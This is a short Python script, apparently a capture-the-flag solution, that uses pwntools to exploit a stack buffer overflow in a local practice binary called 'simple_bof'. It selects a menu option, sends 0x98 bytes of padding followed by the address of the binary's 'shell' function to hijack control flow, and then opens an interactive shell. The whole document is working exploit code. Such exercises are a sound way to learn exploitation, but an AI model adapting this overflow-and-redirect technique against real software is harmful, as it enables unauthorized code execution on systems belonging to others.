from pwn import *

# context.log_level = "DEBUG"
context.arch = "amd64"

e = ELF("./simple_bof")
p = process("./simple_bof")

p.sendlineafter(">", "4")
p.sendlineafter("\n", flat("A"*0x98, e.symbols["shell"]))

p.interactive()